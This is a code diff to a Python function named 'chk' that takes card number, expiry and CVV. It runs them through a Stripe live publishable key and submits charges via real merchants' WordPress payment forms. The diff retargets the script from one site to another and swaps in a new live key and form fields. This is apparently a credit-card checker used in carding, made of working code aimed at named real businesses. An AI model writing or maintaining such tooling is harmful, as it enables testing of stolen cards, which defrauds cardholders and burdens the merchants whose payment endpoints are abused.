@@ -74,7 +74,7 @@ def chk(CCN, MM, YY, CVV):
         "guid": Guid,
         "muid": Muid,
         "sid": Sid,
-        "key": "pk_live_8nHNgurCsBkFZNukDOLgJ13T",
+        "key": "pk_live_5YHU0akiB45684n5IDUJePVi",
         "card[number]": int(CCN),
         "card[exp_month]": MM,
         "card[exp_year]": int(YY),
@@ -89,14 +89,14 @@ def chk(CCN, MM, YY, CVV):
 
     load = {
         "action": "wp_full_stripe_payment_charge",
-        "formName": "PaymentForm",
+        "formName": "online_payment",
         "fullstripe_name": Name,
         "fullstripe_email": Email,
         "fullstripe_custom_amount": amount,
-        "fullstripe_address_line1": Street,
-        "fullstripe_address_city": City,
-        "fullstripe_address_state": State,
-        "fullstripe_address_zip": Zip,
+        "customAmount": "custom_amount",
+        "formDoRedirect": 0,
+        "formRedirectToPageOrPost": 1,
+        "sendEmailReceipt": 1,
         "stripeToken": Id,
     }
 
@@ -108,7 +108,7 @@ def chk(CCN, MM, YY, CVV):
     }
 
     rx = s.post(
-        "https://signaturedjs.com/wp-admin/admin-ajax.php", headers=header, data=load
+        "https://promofactor.com.au/ajax", headers=header, data=load
     )
     msg = rx.json()["msg"]
     
